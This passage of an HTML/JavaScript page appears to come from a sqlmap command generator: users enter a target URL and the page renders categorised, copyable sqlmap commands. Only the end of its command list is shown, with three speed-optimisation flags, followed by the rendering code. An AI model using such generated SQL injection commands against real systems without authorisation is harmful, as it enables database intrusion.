   {l:"All optimizations",r:"high",c:"sqlmap -u \"http://{T}\" -o",e:"Enables all optimization switches for maximum speed."},
   {l:"Predict output",r:"medium",c:"sqlmap -u \"http://{T}\" --predict-output",e:"Predicts output for common queries to reduce requests."},
   {l:"Keep-alive connections",r:"medium",c:"sqlmap -u \"http://{T}\" --keep-alive",e:"Uses HTTP keep-alive for faster multiple requests."}
 ]
}
];

/* ── STATE ── */
var TARGET = "";
var FILTER = "all";
var QUERY  = "";
var VIEW   = "cards";

/* ── HELPERS ── */
function esc(s) {
  return String(s)
    .replace(/&/g,"&amp;")
    .replace(/</g,"&lt;")
    .replace(/>/g,"&gt;")
    .replace(/"/g,"&quot;");
}
function validTarget(t) {
  var d = t.trim().toLowerCase();
  // URL with parameter or base URL
  return /^https?:\/\//i.test(d);
}
function cleanTarget(t) {
  return t.trim().replace(/^https?:\/\//i, "");
}
function fillCmd(c) { return c.replace(/\{T\}/g, TARGET); }
function totalCmds() {
  var n = 0;
  for (var i = 0; i < CATS.length; i++) { n += CATS[i].cmds.length; }
  return n;
}
function colorize(raw) {
  var s = esc(fillCmd(raw));
  s = s.replace(/^([a-zA-Z0-9_\-\.\/]+)/,'<span class="kw">$1</span>');
  s = s.replace(/(\s)(--?[a-zA-Z][a-zA-Z0-9\-_\.]*)/g,'$1<span class="fl">$2</span>');
  if (TARGET) {
    var et = esc(TARGET);
    var re = new RegExp(et.replace(/[.*+?^${}()|[\]\\]/g,"\\$&"),"g");
    s = s.replace(re,'<span class="tgt">'+et+"</span>");
  }
  return s;
}

/* ── FILTER / SEARCH ── */
function getVisibleCats() {
  return CATS.filter(function(cat) {
    if (FILTER !== "all" && cat.id !== FILTER) { return false; }
    if (!QUERY) { return true; }
    var q = QUERY.toLowerCase();
    if (cat.title.toLowerCase().indexOf(q) >= 0) { return true; }
    if (cat.desc.toLowerCase().indexOf(q) >= 0) { return true; }
    for (var i = 0; i < cat.cmds.length; i++) {
      var cm = cat.cmds[i];
      if (cm.l.toLowerCase().indexOf(q) >= 0 ||
          cm.c.toLowerCase().indexOf(q) >= 0 ||
          cm.e.toLowerCase().indexOf(q) >= 0) { return true; }
    }
    return false;
  });
}
function getFilteredCmds(cat) {
  if (!QUERY) { return cat.cmds; }
  var q = QUERY.toLowerCase();
  return cat.cmds.filter(function(cm) {
    return cm.l.toLowerCase().indexOf(q) >= 0 ||
           cm.c.toLowerCase().indexOf(q) >= 0 ||
           cm.e.toLowerCase().indexOf(q) >= 0;
  });
}

/* ── COPY ── */
function doCopy(text, btn) {
  var orig = btn.textContent;
  function ok() {
    btn.textContent = "Copied!";
    btn.classList.add("ok");
    setTimeout(function(){ btn.textContent = orig; btn.classList.remove("ok"); }, 2000);
  }
  function fb() {
    var ta = document.createElement("textarea");
    ta.value = text;
    ta.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0;";
    document.body.appendChild(ta);
    ta.focus(); ta.select();
    try { document.execCommand("copy"); ok(); } catch(e) {}
    document.body.removeChild(ta);
  }
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(ok, fb);
  } else { fb(); }
}
function copyFromBlock(bid, btn) {
  var el = document.getElementById(bid);
  if (!el) { return; }
  var pre = el.querySelector(".dpre");
  if (!pre) { return; }
  doCopy(pre.innerText.trim(), btn);
}
function copyInline(btn) { doCopy(btn.getAttribute("data-v"), btn); }

/* ── GENERATE ── */
function doGenerate() {
  var raw = document.getElementById("targetInput").value;
  var errBox = document.getElementById("errbox");
  if (!raw || !raw.trim() || !validTarget(raw)) {
    errBox.style.display = "block";
    return;
  }
  errBox.style.display = "none";
  TARGET = cleanTarget(raw);
  FILTER = "all";
  QUERY  = "";
  var si = document.getElementById("searchInput");
  if (si) { si.value = ""; }
  document.getElementById("sc1").textContent = CATS.length;
  document.getElementById("sc2").textContent = totalCmds();
  document.getElementById("sc3").textContent = TARGET;
  document.getElementById("statsbar").style.display = "flex";
  document.getElementById("toolbar").style.display  = "flex";
  document.getElementById("pills").style.display    = "flex";
  document.getElementById("mainLayout").style.display = "grid";
  buildSidebar(); buildPills(); render();
  setTimeout(function(){
    document.getElementById("mainLayout").scrollIntoView({behavior:"smooth",block:"start"});
  }, 100);
}

/* ── SIDEBAR ── */
function buildSidebar() {
  var h = '<div class="sbt">Navigation</div>';
  h += '<button class="sbtn on" data-cat="all">';
  h += '<span class="sbico">&#128203;</span>';
  h += '<span class="sblbl">All Categories</span>';
  h += '<span class="sbcnt">'+CATS.length+"</span></button>";
  h += '<div class="sbsep"></div>';
  h += '<div class="sbt">SQLMap Techniques</div>';
  for (var i = 0; i < CATS.length; i++) {
    var c = CATS[i];
    h += '<button class="sbtn" data-cat="'+c.id+'">';
    h += '<span class="sbico">'+c.icon+"</span>";
    h += '<span class="sblbl">'+esc(c.title)+"</span>";
    h += '<span class="sbcnt">'+c.cmds.length+"</span></button>";
  }
  var sb = document.getElementById("sidebar");
  sb.innerHTML = h;
  var btns = sb.querySelectorAll(".sbtn[data-cat]");
  for (var j = 0; j < btns.length; j++) {
    btns[j].addEventListener("click", function(){
      setFilter(this.getAttribute("data-cat"));
    });
  }
}

/* ── PILLS ── */
function buildPills() {
  var h = '<span class="pill on" data-cat="all">All</span>';
  for (var i = 0; i < CATS.length; i++) {
    var c = CATS[i];
    h += '<span class="pill" data-cat="'+c.id+'">'+c.icon+" "+esc(c.title)+"</span>";
  }
  var container = document.getElementById("pills");
  container.innerHTML = h;
  var pills = container.querySelectorAll(".pill");
  for (var j = 0; j < pills.length; j++) {
    pills[j].addEventListener("click", function(){
      setFilter(this.getAttribute("data-cat"));
    });
  }
}

/* ── SET FILTER / VIEW ── */
function setFilter(id) {
  FILTER = id;
  var pills = document.querySelectorAll(".pill");
  for (var i = 0; i < pills.length; i++) {
    pills[i].classList.toggle("on", pills[i].getAttribute("data-cat") === id);
  }
  var btns = document.querySelectorAll(".sbtn[data-cat]");
  for (var j = 0; j < btns.length; j++) {
    btns[j].classList.toggle("on", btns[j].getAttribute("data-cat") === id);
  }
  render();
}
function setView(v) {
  VIEW = v;
  document.getElementById("vcard").classList.toggle("on", v === "cards");
  document.getElementById("vcomp").classList.toggle("on", v === "compact");
  render();
}
function togParams(wid, tid) {
  var w = document.getElementById(wid);
  var t = document.getElementById(tid);
  if (!w || !t) { return; }
  var o = w.classList.contains("open");
  w.classList.toggle("open", !o);
  t.classList.toggle("open", !o);
}

/* ── RENDER ── */
function render() {
  var content = document.getElementById("content");
  var cats = getVisibleCats();
  if (!cats.length) {
    content.innerHTML = '<div class="nores"><h3>No commands found</h3><p>Try a different search term or select a different category.</p></div>';
    return;
  }
  if (VIEW === "compact") { renderCompact(content, cats); }
  else { renderCards(content, cats); }
}

function renderCards(content, cats) {
  var html = "";
  for (var i = 0; i < cats.length; i++) {
    var cat = cats[i];
    var cmds = getFilteredCmds(cat);
    if (!cmds.length) { continue; }
    html += '<div class="sec" id="sec-'+cat.id+'">';
    html += '<div class="sechdr">';
    html += '<span class="secico">'+cat.icon+"</span>";
    html += "<div>";
    html += '<div class="sectitle">'+esc(cat.title)+"</div>";
    html += '<div class="secsub">'+esc(cat.desc)+"</div>";
    html += "</div>";
    html += '<span class="seccnt">'+cmds.length+' cmd'+(cmds.length!==1?"s":"")+"</span>";
    html += "</div>";
    html += '<div class="grid">';
    for (var j = 0; j < cmds.length; j++) {
      html += buildCard(cat, cmds[j], cat.id+"_"+j);
    }
    html += "</div></div>";
  }
  content.innerHTML = html;
}

function buildCard(cat, cm, uid) {
  var bid   = "blk_"+uid;
  var ptid  = "pt_"+uid;
  var togid = "ptog_"+uid;
  var risk  = cm.r || "info";
  var h = "";
  h += '<div class="card">';
  h += '<div class="ch">';
  h += '<div class="ctrow">';
  h += '<span class="cico">'+cat.icon+"</span>";
  h += '<span class="cname">'+esc(cm.l)+"</span>";
  h += '<div class="cbadges">';
  h += '<span class="bdg '+cat.badge+'">'+esc(cat.id)+"</span>";
  h += '<span class="rb r-'+risk+'">'+risk+"</span>";
  h += "</div></div>";
  h += '<div class="what">';
  h += '<div class="wlbl">What This Command Does</div>';
  h += esc(cm.e);
  h += "</div>";
  h += "</div>";
  h += '<div class="cb">';
  h += '<div class="dblk" id="'+bid+'">';
  h += '<div class="dbar">';
  h += '<div class="dbar-l">';
  h += '<div class="dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>';
  h += '<span style="font-family:var(--mono);font-size:.66rem;color:var(--mut)">terminal</span>';
  h += "</div>";
  h += '<div class="dbar-r">';
  h += '<span class="rb r-'+risk+'">'+risk+"</span>";
  h += '<button class="cbtn" onclick="copyFromBlock(\''+bid+'\',this)">Copy</button>';
  h += "</div></div>";
  h += '<pre class="dpre">'+colorize(cm.c)+"</pre>";
  h += "</div>";
  if (cat.flags && cat.flags.length) {
    h += '<button class="ptog" id="'+togid+'" onclick="togParams(\''+ptid+'\',\''+togid+'\')">';
    h += "<span>Flags Reference ("+cat.flags.length+")</span>";
    h += '<span class="arr">&#9660;</span>';
    h += "</button>";
    h += '<div class="pwrap" id="'+ptid+'">';
    h += '<table class="ptbl"><thead><tr><th>Flag</th><th>Description</th></tr></thead><tbody>';
    for (var k = 0; k < cat.flags.length; k++) {
      h += "<tr>";
      h += '<td class="pf">'+esc(cat.flags[k].f)+"</td>";
      h += '<td class="pd">'+esc(cat.flags[k].d)+"</td>";
      h += "</tr>";
    }
    h += "</tbody></table></div>";
  }
  if (cat.tip) {
    h += '<div class="tip"><span>&#128161;</span><span>'+esc(cat.tip)+"</span></div>";
  }
  if (cat.warn) {
    h += '<div class="wrn"><span>&#9888;</span><span>'+esc(cat.warn)+"</span></div>";
  }
  h += "</div>";
  h += "</div>";
  return h;
}

function renderCompact(content, cats) {
  var html = '<div class="ctable">';
  html += '<div class="chdr"><div>Command Name</div><div>Command</div><div>Risk</div><div>Copy</div></div>';
  for (var i = 0; i < cats.length; i++) {
    var cmds = getFilteredCmds(cats[i]);
    for (var j = 0; j < cmds.length; j++) {
      var cm   = cmds[j];
      var risk = cm.r || "info";
      var filled = fillCmd(cm.c);
      html += '<div class="crow">';
      html += '<span class="cr-name" title="'+esc(cm.e)+'">'+cats[i].icon+" "+esc(cm.l)+"</span>";
      html += '<span class="cr-cmd" title="'+esc(filled)+'">'+esc(filled)+"</span>";
      html += '<span><span class="rb r-'+risk+'">'+risk+"</span></span>";
      html += '<span class="cr-act"><button class="crc" data-v="'+esc(filled)+'" onclick="copyInline(this)">Copy</button></span>';
      html += "</div>";
    }
  }
  html += "</div>";
  content.innerHTML = html;
}

/* ── BOOT ── */
(function() {
  var btn = document.getElementById("generateBtn");
  if (btn) {
    btn.addEventListener("click", function(e){ e.preventDefault(); doGenerate(); });
  }
  var inp = document.getElementById("targetInput");
  if (inp) {
    inp.addEventListener("keydown", function(e){ if (e.key==="Enter"){ e.preventDefault(); doGenerate(); } });
  }
  var si = document.getElementById("searchInput");
  if (si) {
    function doSearch(){ QUERY = si.value.trim(); render(); }
    si.addEventListener("input",  doSearch);
    si.addEventListener("keyup",  doSearch);
    si.addEventListener("change", doSearch);
  }
  var vc = document.getElementById("vcard");
  var vp = document.getElementById("vcomp");
  if (vc) { vc.addEventListener("click", function(){ setView("cards"); }); }
  if (vp) { vp.addEventListener("click", function(){ setView("compact"); }); }
})();
</script>
</body>
</html>
